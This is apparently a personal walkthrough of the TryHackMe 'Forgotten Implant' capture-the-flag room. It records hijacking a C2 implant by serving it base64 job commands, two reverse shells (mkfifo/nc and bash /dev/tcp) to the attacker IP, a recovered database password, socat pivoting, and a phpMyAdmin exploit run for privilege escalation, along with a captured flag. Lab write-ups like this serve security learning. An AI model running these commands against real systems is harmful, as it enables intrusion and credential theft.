## 29072023Sat

[TryHackMe | Forgotten Implant](https://tryhackme.com/room/forgottenimplant)

```
With almost no attack surface, you must use a forgotten C2 implant to get initial access.
```

![[Pasted image 20230729211210.png]]

![[Pasted image 20230729212215.png]]

## 01082023Tue

```
nmap -A -T4 -p- 10.10.3.104
```

![[Pasted image 20230801091135.png]]

https://www.youtube.com/@djalilayed

[Forgotten Implant - TryHackMe Walk through -](https://youtu.be/zC77QhGfCIc)

![[Pasted image 20230801100223.png]]

```
nc -lvp 81
```
![[Pasted image 20230801100534.png]]

```
listening on [any] 81 ...
10.10.3.104: inverse host lookup failed: Unknown host
connect to [10.17.44.152] from (UNKNOWN) [10.10.3.104] 41046
GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDFUMDM6MzU6MDEuOTI4OTgxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1
Host: 10.17.44.152:81
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

```
echo 'eyJ0aW1lIjogIjIwMjMtMDgtMDFUMDM6MzU6MDEuOTI4OTgxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9' |base64 -d
```

```
{"time": "2023-08-01T03:35:01.928981", "systeminfo": {"os": "Linux", "hostname": "forgottenimplant"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}
```

```
{
    "time": "2023-08-01T03:35:01.928981",
    "systeminfo": {
        "os": "Linux",
        "hostname": "forgottenimplant"
    },
    "latest_job": {
        "job_id": 0,
        "cmd": "whoami"
    },
    "success": false
}
```

https://www.youtube.com/@osmandagdelen9575

[Forgotten Implant - CTF (TryHackMe) | detail explained](https://youtu.be/fMYzeFQ1RL0)

```
import http.server import socketserver PORT = 81 class MyRequestHandler(http.server.SimpleHTTPRequestHandler): def do_GET(self): self.send_response(200) self.send_header("Content-type", "text/plain") self.end_headers() self.wfile.write(b"<JSON CODE HERE>") with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd: print("Server listening on port", PORT) httpd.serve_forever()
```

![[Pasted image 20230801102900.png]]

```
Server listening on port 81
10.10.3.104 - - [01/Aug/2023 10:35:02] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDFUMDQ6MDU6MDEuNjQ2MjQyIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 200 -
10.10.3.104 - - [01/Aug/2023 10:35:03] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
10.10.3.104 - - [01/Aug/2023 10:35:04] "GET /job-result/eyJqb2JfaWQiOiAxMDEsICJjbWQiOiAiY2F0IHVzZXIudHh0IiwgInN1Y2Nlc3MiOiB0cnVlLCAicmVzdWx0IjogIlRITXs5MDJlOGU4YjFmNDlkZmViNjc4ZTQxOTkzNWJlMjNlZn1cbiJ9 HTTP/1.1" 200 -
10.10.3.104 - - [01/Aug/2023 10:36:02] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDFUMDQ6MDY6MDEuNDEwNTU2IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDEwMSwgImNtZCI6ICJjYXQgdXNlci50eHQiLCAic3VjY2VzcyI6IHRydWUsICJyZXN1bHQiOiAiVEhNezkwMmU4ZThiMWY0OWRmZWI2NzhlNDE5OTM1YmUyM2VmfVxuIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 200 -
10.10.3.104 - - [01/Aug/2023 10:36:03] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
10.10.3.104 - - [01/Aug/2023 10:36:03] "GET /job-result/eyJqb2JfaWQiOiAxMDEsICJjbWQiOiAiY2F0IHVzZXIudHh0IiwgInN1Y2Nlc3MiOiB0cnVlLCAicmVzdWx0IjogIlRITXs5MDJlOGU4YjFmNDlkZmViNjc4ZTQxOTkzNWJlMjNlZn1cbiJ9 HTTP/1.1" 200 -
```

![[Pasted image 20230801103604.png]]

![[Pasted image 20230801103741.png]]

```
{"job_id": 101, "cmd": "cat user.txt", "success": true, "result": "THM{902e8e8b1f49dfeb678e419935be23ef}\n"}
```

```
THM{902e8e8b1f49dfeb678e419935be23ef}
```

```
{
    "job_id": 102,
    "cmd": "cat products.py"
}
```

```
ewogICAgImpvYl9pZCI6IDEwMiwKICAgICJjbWQiOiAiY2F0IHByb2R1Y3RzLnB5Igp9
```

```
import http.server
import socketserver

PORT = 81

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self): 
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ewogICAgImpvYl9pZCI6IDEwMiwKICAgICJjbWQiOiAiY2F0IHByb2R1Y3RzLnB5Igp9")
with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
    print("Server listening on port", PORT)
    httpd.serve_forever()
```

```
eyJqb2JfaWQiOiAxMDIsICJjbWQiOiAiY2F0IHByb2R1Y3RzLnB5IiwgInN1Y2Nlc3MiOiB0cnVlLCAicmVzdWx0IjogImltcG9ydCBteXNxbC5jb25uZWN0b3JcblxuZGIgPSBteXNxbC5jb25uZWN0b3IuY29ubmVjdChcbiAgICBob3N0PSdsb2NhbGhvc3QnLCBcbiAgICBkYXRhYmFzZT0nYXBwJywgXG4gICAgdXNlcj0nYXBwJywgXG4gICAgcGFzc3dvcmQ9J3M0VWNicm1lJ1xuICAgIClcblxuY3Vyc29yID0gZGIuY3Vyc29yKClcbmN1cnNvci5leGVjdXRlKCdTRUxFQ1QgKiBGUk9NIHByb2R1Y3RzJylcblxuZm9yIHByb2R1Y3QgaW4gY3Vyc29yLmZldGNoYWxsKCk6XG4gICAgcHJpbnQoZidXZSBoYXZlIHtwcm9kdWN0WzJdfXgge3Byb2R1Y3RbMV19JylcbiJ9
```

```
{"job_id": 102, "cmd": "cat products.py", "success": true, "result": "import mysql.connector\n\ndb = mysql.connector.connect(\n    host='localhost', \n    database='app', \n    user='app', \n    password='s4Ucbrme'\n    )\n\ncursor = db.cursor()\ncursor.execute('SELECT * FROM products')\n\nfor product in cursor.fetchall():\n    print(f'We have {product[2]}x {product[1]}')\n"}
```

```
{
    "job_id": 102,
    "cmd": "cat products.py",
    "success": true,
    "result": "import mysql.connector\n\ndb = mysql.connector.connect(\n    host='localhost', \n    database='app', \n    user='app', \n    password='s4Ucbrme'\n    )\n\ncursor = db.cursor()\ncursor.execute('SELECT * FROM products')\n\nfor product in cursor.fetchall():\n    print(f'We have {product[2]}x {product[1]}')\n"
}
```

```
import mysql.connector\n\ndb = mysql.connector.connect(\n    host='localhost', \n    database='app', \n    user='app', \n    password='s4Ucbrme'\n    )\n\ncursor = db.cursor()\ncursor.execute('SELECT * FROM products')\n\nfor product in cursor.fetchall():\n    print(f'We have {product[2]}x {product[1]}')\n
```

![[Pasted image 20230801104848.png]]

```
{
    "job_id": 1337,
    "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc 10.17.44.152 1337 >/tmp/f"
}
```

```
ewogICAgImpvYl9pZCI6IDEzMzcsCiAgICAiY21kIjogInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2YgfCAvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xNy40NC4xNTIgMTMzNyA+L3RtcC9mIgp9
```

![[Pasted image 20230801110627.png]]

![[Pasted image 20230801110701.png]]

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+z
stty raw -echo && fg
```

![[Pasted image 20230801110856.png]]

![[Pasted image 20230801111038.png]]

```
mysql -h localhost -u app -p s4Ucbrme
```

![[Pasted image 20230801111445.png]]

```
./socat TCP4-LISTEN:8080,fork TCP4:127.0.0.1:80
```

```
wget http://10.17.44.152:81/socat
```

![[Pasted image 20230801112702.png]]
![[Pasted image 20230801112721.png]]

https://www.exploit-db.com/exploits/50457

![[Pasted image 20230801113247.png]]

![[Pasted image 20230801113409.png]]

*shell.sh*
```
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.17.44.152/50457 0>&1
```

![[Pasted image 20230801113728.png]]

```
python3 50457.py 127.0.0.1 80 / app s4Ucbrme /home/ada/shell.sh
```

![[Pasted image 20230801120711.png]]

![[Pasted image 20230801121740.png]]

```
ssh -R 8888:localhost:80 kali@10.17.44.152
```

```
python3 50457.py 10.10.3.104 8080 / app s4Ucbrme "sudo /usr/bin/php /home/ada/php-reverse-shell.php
```

![[Pasted image 20230801123155.png]]
